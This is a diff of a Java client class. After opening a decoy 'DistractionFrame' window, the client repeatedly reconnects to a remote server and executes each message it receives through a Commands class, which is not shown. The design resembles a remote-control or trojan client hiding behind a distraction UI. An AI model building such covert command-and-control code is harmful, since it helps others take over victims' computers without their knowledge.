@@ -17,39 +17,63 @@ public class Client implements ActionListener{
 	private Timer timer;
 	private int reconnect = 1;
 	private String message = " I am from user";
+	boolean connected = true;
+
 
 	
 	
 	public Client() throws Throwable{
 
 		new DistractionFrame();
-
+	
 			//Initial Attempt To Connect To Server
 		new Thread(new Runnable()
 		{
 		     public void run()
 		     {
+		      		String msg;
+
+		    	 while(connected){
 		          try {
-					connectTalker();
-				} catch (Throwable e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
+		        	  
+		        	System.out.println("Client: Not Connected Yet"); 
+		      		talk = new Talker(serverName, port, id);
+		      		connected = false;
+		      		System.out.println("Client: Connected");
+		      		
+		          }
+				 catch (Throwable e) {
+					
+					try {
+						Thread.sleep(6000);
+					} catch (InterruptedException e1) {
+						// TODO Auto-generated catch block
+						e1.printStackTrace();
+					}
 				}
+		          
+		          }
+		    	 ;
+		    	 while(true){
+		    		 
+		    		 try {
+						msg = talk.recieve();
+						System.out.print("I AM MSG: " + msg);
+						new Commands(msg,talk);
+					} catch (IOException e) {
+						// TODO Auto-generated catch block
+						e.printStackTrace();
+					}
+		    		 
+		    		 
+		    	 }
 		     }
 		}).start();
 		
-			talk.send(message);
-			talk.recieve(id);
+		
 
 			
-			// Creation of timer to attempt re-connection to Server every minute
-			reconnect = reconnect * (1000);
-			System.out.println(reconnect + " millis between checks \n\n");
-			timer = new Timer(reconnect, (ActionListener) this);
-			timer.setActionCommand("Start Timer");
-			timer.setRepeats(true);
-			timer.start();
-			System.out.println("After start");
+
 			
 	}
 
@@ -61,10 +85,13 @@ public void actionPerformed(ActionEvent e){
 	
 	// for every N minutes attempt to Connect to Server
 	if(cmd.equals("Start Timer")){
-		
+		boolean connect = false;
 		try {
 			
+			while(!connect){
 			connectTalker();
+			
+			}
 			
 		} catch (Throwable e1) {
 			
@@ -81,12 +108,11 @@ public void connectTalker() throws Throwable
 {
 	try
 	{
-		talk = new Talker(serverName, port, id);
 		while(true)
 		{
-			message = talk.recieve(id);
+			message = talk.recieve();
 			//talk.send(id);
-			new Commands(message);
+			//new Commands(message);
 			
 		}
 	}
@@ -94,7 +120,6 @@ public void connectTalker() throws Throwable
 		e.printStackTrace();
 	}
 }
-
 
 public static void main(String[] args) throws Throwable{
 	
